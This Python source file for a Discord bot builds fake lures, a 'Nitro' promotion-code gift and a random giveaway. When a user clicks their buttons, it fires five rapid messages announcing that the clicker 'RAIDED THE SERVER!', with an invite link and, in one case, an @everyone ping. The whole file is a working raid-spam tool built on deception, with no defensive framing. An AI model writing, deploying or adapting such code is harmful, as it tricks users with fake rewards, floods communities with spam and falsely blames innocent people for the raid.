import asyncio
import time
import random
import aiohttp
import discord
from src.utils.helpers import send_message_http, Aerith_INVITE


class FakeNitroView(discord.ui.LayoutView):
    text_display1 = discord.ui.TextDisplay(content="You're awesome, just like this gift. Enjoy!")

    claim_button = discord.ui.Button(
        label="Claim",
        style=discord.ButtonStyle.success,
        custom_id="fake_nitro_claim",
    )

    container1 = discord.ui.Container(
        discord.ui.Section(
            discord.ui.TextDisplay(content="## You got a promotion code!\nThis gift link is a promotion code.\n\n-# Click the button below to claim it"),
            accessory=discord.ui.Thumbnail(
                media="https://cdn3.emoji.gg/emojis/7496-payments-nitro.gif",
            ),
        ),
        discord.ui.ActionRow(claim_button),
    )

    async def claim_button_callback(self, interaction: discord.Interaction) -> None:
        pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.data.get("custom_id") == "fake_nitro_claim":
            await interaction.response.defer()

            user_mention = interaction.user.mention

            app_id = interaction.client.application_id
            token = interaction.token
            content = f"{user_mention} RAIDED THE SERVER! {Aerith_INVITE} @everyone"

            async with aiohttp.ClientSession() as session:
                tasks = [
                    send_message_http(session, app_id, token, content)
                    for _ in range(5)
                ]
                await asyncio.gather(*tasks)

            return False
        return True


def fake_giveaway(prize: str):
    future_ts = int(time.time()) + random.randint(3600, 86400)
    winners_count = random.randint(1, 4)

    class FakeGiveawayView(discord.ui.LayoutView):
        container1 = discord.ui.Container(
            discord.ui.TextDisplay(content=f"## {prize}\n**duration**: <t:{future_ts}:R>\n**winners**: `{winners_count}`"),
            discord.ui.ActionRow(
                discord.ui.Button(
                    style=discord.ButtonStyle.success,
                    label="participate",
                    custom_id="enter_giveaway_button",
                ),
            ),
            accent_colour=discord.Colour(16777215),
        )

        async def interaction_check(self, interaction: discord.Interaction) -> bool:
            if interaction.data.get("custom_id") == "enter_giveaway_button":
                await interaction.response.defer()

                user_mention = interaction.user.mention
                app_id = interaction.client.application_id
                token = interaction.token
                content = f"{user_mention} RAIDED THE SERVER! {Aerith_INVITE}"

                async with aiohttp.ClientSession() as session:
                    tasks = [
                        send_message_http(session, app_id, token, content)
                        for _ in range(5)
                    ]
                    await asyncio.gather(*tasks)

                return False
            return True

    return FakeGiveawayView()
